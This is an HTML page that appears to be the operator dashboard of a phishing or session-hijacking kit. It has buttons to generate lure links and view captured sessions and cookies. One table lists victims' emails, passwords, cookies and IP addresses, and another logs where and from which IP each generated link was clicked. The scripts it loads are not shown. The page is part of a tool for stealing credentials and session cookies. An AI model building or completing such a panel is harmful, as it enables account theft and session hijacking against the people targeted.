<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body class="dashboard-body">
    <div class="sidebar">
        <h2>Menu</h2>
        <button class="menu-btn" onclick="generateLink()">Generate Link</button>
        <button class="menu-btn" onclick="fetchCapturedSessions()">Captured Sessions</button>
        <button class="menu-btn" onclick="fetchCookies()">Cookies</button>
        <button class="menu-btn logout-btn" onclick="logout()">Logout</button>
    </div>

    <div class="main-content">
        <h2>Dashboard</h2>
        <div id="generated-link"></div>
        
        <h3>Captured Sessions</h3>
        <table id="captured-sessions">
            <thead>
                <tr>
                    <th>Email</th>
                    <th>Password</th>
                    <th>Cookies</th>
                    <th>IP</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>

        <h3>Generated Links History</h3>
        <table id="link-history">
            <thead>
                <tr>
                    <th>Generated Link</th>
                    <th>Location Clicked</th>
                    <th>IP Address</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>
    </div>
    
    <script src="firebase-config.js"></script>
    <script src="script.js"></script>
</body>
</html>
